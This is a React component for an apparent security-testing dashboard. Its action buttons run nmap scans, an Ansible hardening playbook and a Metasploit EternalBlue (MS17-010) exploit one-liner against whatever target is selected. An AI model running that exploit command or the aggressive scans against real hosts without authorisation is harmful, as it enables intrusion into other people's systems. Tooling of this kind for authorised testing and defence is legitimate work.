import React from 'react';
import { Card, Button, Empty } from 'antd';
import { ScanOutlined, BugOutlined, LockOutlined, ThunderboltOutlined } from '@ant-design/icons';

const ActionPanel = ({ selectedTarget, onExecute }) => {
    if (!selectedTarget) {
        return (
            <Card title="Contextual Actions" size="small" bordered={false}>
                <Empty description="No target selected. Select a target to see available actions." />
            </Card>
        );
    }
    
    const actions = [
        { name: 'Aggressive Scan', icon: <ScanOutlined />, command: `nmap -T4 -A -v ${selectedTarget}`},
        { name: 'Vuln Scan', icon: <BugOutlined />, command: `nmap --script vuln ${selectedTarget}`},
        { name: 'Harden (Defensive)', icon: <LockOutlined />, command: `ansible-playbook harden.yml --limit ${selectedTarget}`},
        { name: 'Exploit (MS17-010)', icon: <ThunderboltOutlined />, command: `msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS ${selectedTarget}; run"`},
    ];

    return (
        <Card title={`Actions for: ${selectedTarget}`} size="small" bordered={false}>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                {actions.map(action => (
                    <Button key={action.name} icon={action.icon} block onClick={() => onExecute(action.command)}>
                        {action.name}
                    </Button>
                ))}
            </div>
        </Card>
    );
};

export default ActionPanel;
